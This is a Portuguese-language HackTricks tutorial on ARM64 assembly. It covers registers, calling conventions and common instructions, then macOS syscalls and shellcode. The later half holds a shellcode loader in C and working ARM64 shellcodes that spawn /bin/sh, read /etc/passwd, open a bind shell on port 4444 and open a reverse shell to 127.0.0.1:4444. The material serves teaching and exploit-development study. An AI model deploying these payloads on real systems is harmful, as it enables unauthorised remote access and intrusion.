# Introdução ao ARM64

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Introdução ao ARM64**

ARM64, também conhecido como ARMv8-A, é uma arquitetura de processador de 64 bits usada em vários tipos de dispositivos, incluindo smartphones, tablets, servidores e até mesmo alguns computadores pessoais de alta qualidade (macOS). É um produto da ARM Holdings, uma empresa conhecida por seus designs de processadores eficientes em energia.

### **Registradores**

O ARM64 possui **31 registradores de propósito geral**, rotulados de `x0` a `x30`. Cada um pode armazenar um valor de **64 bits** (8 bytes). Para operações que requerem apenas valores de 32 bits, os mesmos registradores podem ser acessados em um modo de 32 bits usando os nomes w0 a w30.

1. **`x0`** a **`x7`** - Geralmente são usados como registradores temporários e para passar parâmetros para sub-rotinas.
* **`x0`** também carrega os dados de retorno de uma função.
2. **`x8`** - No kernel do Linux, `x8` é usado como o número de chamada do sistema para a instrução `svc`. **No macOS, o x16 é o usado!**
3. **`x9`** a **`x15`** - Mais registradores temporários, frequentemente usados para variáveis locais.
4. **`x16`** e **`x17`** - Registradores temporários, também usados para chamadas de função indiretas e stubs da PLT (Procedure Linkage Table).
* **`x16`** é usado como o número de chamada do sistema para a instrução **`svc`**.
5. **`x18`** - Registrador de plataforma. Em algumas plataformas, este registrador é reservado para usos específicos da plataforma.
6. **`x19`** a **`x28`** - São registradores preservados pelo chamado. Uma função deve preservar os valores desses registradores para seu chamador.
7. **`x29`** - Ponteiro de quadro.
8. **`x30`** - Registrador de link. Ele armazena o endereço de retorno quando uma instrução `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) é executada.
9. **`sp`** - Ponteiro de pilha, usado para acompanhar o topo da pilha.
10. **`pc`** - Contador de programa, que aponta para a próxima instrução a ser executada.

### **Convenção de Chamada**

A convenção de chamada do ARM64 especifica que os **oito primeiros parâmetros** de uma função são passados nos registradores **`x0` a `x7`**. Parâmetros **adicionais** são passados na **pilha**. O valor de **retorno** é passado de volta no registrador **`x0`**, ou também em **`x1`** se tiver **128 bits**. Os registradores **`x19`** a **`x30`** e **`sp`** devem ser **preservados** entre chamadas de função.

Ao ler uma função em assembly, procure pelo **prólogo e epílogo da função**. O **prólogo** geralmente envolve **salvar o ponteiro de quadro (`x29`)**, **configurar** um **novo ponteiro de quadro** e **alocar espaço na pilha**. O **epílogo** geralmente envolve **restaurar o ponteiro de quadro salvo** e **retornar** da função.

### Convenção de Chamada em Swift

O Swift possui sua própria **convenção de chamada** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

### **Instruções Comuns**

As instruções do ARM64 geralmente têm o **formato `opcode dst, src1, src2`**, onde **`opcode`** é a **operação** a ser realizada (como `add`, `sub`, `mov`, etc.), **`dst`** é o registrador **destino** onde o resultado será armazenado, e **`src1`** e **`src2`** são os registradores **fonte**. Valores imediatos também podem ser usados no lugar de registradores fonte.

* **`mov`**: **Move** um valor de um **registrador** para outro.
* Exemplo: `mov x0, x1` — Isso move o valor de `x1` para `x0`.
* **`ldr`**: **Load** um valor da **memória** para um **registrador**.
* Exemplo: `ldr x0, [x1]` — Isso carrega um valor da localização de memória apontada por `x1` para `x0`.
* **`str`**: **Store** um valor de um **registrador** para a **memória**.
* Exemplo: `str x0, [x1]` — Isso armazena o valor em `x0` na localização de memória apontada por `x1`.
* **`ldp`**: **Load Pair of Registers**. Essa instrução **carrega dois registradores** de **locais de memória consecutivos**. O endereço de memória é normalmente formado pela adição de um deslocamento ao valor de outro registrador.
* Exemplo: `ldp x0, x1, [x2]` — Isso carrega `x0` e `x1` dos locais de memória em `x2` e `x2 + 8`, respectivamente.
* **`stp`**: **Store Pair of Registers**. Essa instrução **armazena dois registradores** em **locais de memória consecutivos**. O endereço de memória é normalmente formado pela adição de um deslocamento ao valor de outro registrador.
* Exemplo: `stp x0, x1, [x2]` — Isso armazena `x0` e `x1` nos locais de memória em `x2` e `x2 + 8`, respectivamente.
* **`add`**: **Adiciona** os valores de dois registradores e armazena o resultado em um registrador.
* Exemplo: `add x0, x1, x2` - Isso adiciona os valores em `x1` e `x2` juntos e armazena o resultado em `x0`.
* **`sub`**: **Subtrai** os valores de dois registradores e armazena o resultado em um registrador.
* Exemplo: `sub x0, x1, x2` - Isso subtrai o valor em `x2` de `x1` e armazena o resultado em `x0`.
* **`mul`**: **Multiplica** os valores de **dois registradores** e armazena o resultado em um registrador.
* Exemplo: `mul x0, x1, x2` - Isso multiplica os valores em `x1` e `x2` e armazena o resultado em `x0`.
* **`div`**: **Divide** o valor de um registrador por outro e armazena o resultado em um registrador.
* Exemplo: `div x0, x1, x2` - Isso divide o valor em `x1` por `x2` e armazena o resultado em `x0`.
* **`bl`**: **Branch with link**, usado para **chamar** uma **sub-rotina**. Armazena o **endereço de retorno em `x30`**.
* Exemplo: `bl myFunction` - Isso chama a função `myFunction` e armazena o endereço de retorno em `x30`.
* **`blr`**: **Branch with Link to Register**, usado para **chamar** uma **sub-rotina** onde o destino é **especificado** em um **registrador**. Armazena o endereço de retorno em `x30`.
* Exemplo: `blr x1` - Isso chama a função cujo endereço está contido em `x1` e armazena o endereço de retorno em `x30`.
* **`ret`**: **Retorna** da **sub-rotina**, normalmente usando o endereço em **`x30`**.
* Exemplo: `ret` - Isso retorna da sub-rotina atual usando o endereço de retorno em `x30`.
* **`cmp`**: **Compara** dois registradores e define as flags de condição.
* Exemplo: `cmp x0, x1` - Isso compara os valores em `x0` e `x1` e define as flags de condição de acordo.
* **`b.eq`**: **Branch if equal**, baseado na instrução `cmp` anterior.
* Exemplo: `b.eq label` - Se a instrução `cmp` anterior encontrou dois valores iguais, isso salta para `label`.
* **`b.ne`**: **Branch if Not Equal**. Essa instrução verifica as flags de condição (que foram definidas por uma instrução de comparação anterior) e, se os valores comparados não forem iguais, salta para um rótulo ou endereço.
* Exemplo: Após uma instrução `cmp x0, x1`, `b.ne label` - Se os valores em `x0` e `x1` não forem iguais, isso salta para `label`.
* **`cbz`**: **Compare and Branch on Zero**. Essa instrução compara um registrador com zero e, se forem iguais, salta para um rótulo ou endereço.
* Exemplo: `cbz x0, label` - Se o valor em `x0` for zero, isso salta para `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. Essa instrução compara um registrador com zero e, se não forem iguais, salta para um rótulo ou endereço.
* Exemplo: `cbnz x0, label` - Se o valor em `x0` for diferente de zero, isso salta para `label`.
* **`adrp`**: Calcula o **endereço da página de um símbolo** e o armazena em um registrador.
* Exemplo: `adrp x0, symbol` - Isso calcula o endereço da página de `symbol` e o armazena em `x0`.
* **`ldrsw`**: **Carrega** um valor **32 bits** assinado da memória e o **estende para 64** bits.
* Exemplo: `ldrsw x0, [x1]` - Isso carrega um valor assinado de 32 bits da localização de memória apontada por `x1`, estende-o para 64 bits e o armazena em `x0`.
* **`stur`**: **Armazena um valor de registrador em uma localização de memória**, usando um deslocamento de outro registrador.
* Exemplo: `stur x0, [x1, #4]` - Isso armazena o valor em `x0` no endereço de memória que é 4 bytes maior que o endereço atual em `x1`.
* &#x20;**`svc`** : Faz uma **chamada de sistema**. Significa "Supervisor Call". Quando o processador executa essa instrução, ele **troca do modo usuário para o modo kernel** e salta para um local específico na memória onde o código de tratamento de chamada de sistema do kernel está localizado.
*   Exemplo:&#x20;

```armasm
mov x8, 93  ; Carrega o número de chamada de sistema para saída (93) no registrador x8.
mov x0, 0   ; Carrega o código de status de saída (0) no registrador x0.
svc 0       ; Faz a chamada de sistema.
```

### **Prólogo da Função**

1.  **Salva o registrador de link e o ponteiro de quadro na pilha**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; armazena o par x29 e x30 na pilha e decrementa o ponteiro da pilha
```
{% endcode %}
2. **Configura o novo ponteiro de quadro**: `mov x29, sp` (configura o novo ponteiro de quadro para a função atual)
3. **Aloca espaço na pilha para variáveis locais** (se necessário): `sub sp, sp, <size>` (onde `<size>` é o número de bytes necessário)

### **Epílogo da Função**

1. **Desaloca variáveis locais (se alguma foi alocada)**: `add sp, sp, <size>`
2.  **Restaura o registrador de link e o ponteiro de quadro**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; carrega o par x29 e x30 da pilha e incrementa o ponteiro da pilha
```
{% endcode %}
3. **Retorna**: `ret` (retorna o controle para o chamador usando o endereço no registrador de link)

## macOS

### Chamadas de sistema BSD

Confira [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Chamadas de sistema BSD terão **x16 > 0**.

### Armadilhas Mach

Confira [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). As armadilhas Mach terão **x16 < 0**, então você precisa chamar os números da lista anterior com um **sinal de menos**: **`_kernelrpc_mach_vm_allocate_trap`** é **`-10`**.

Você também pode verificar **`libsystem_kernel.dylib`** em um desmontador para descobrir como chamar essas chamadas de sistema (e as chamadas de sistema BSD).
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Às vezes é mais fácil verificar o código **descompilado** de **`libsystem_kernel.dylib`** do que verificar o **código-fonte**, porque o código de várias chamadas de sistema (BSD e Mach) é gerado por meio de scripts (verifique os comentários no código-fonte), enquanto na dylib você pode encontrar o que está sendo chamado.
{% endhint %}

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Código C para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado [**aqui**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) e explicado.

{% tabs %}
{% tab title="com adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="com pilha" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja encerrado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Shell de Bind

Shell de Bind de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell reverso

De [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
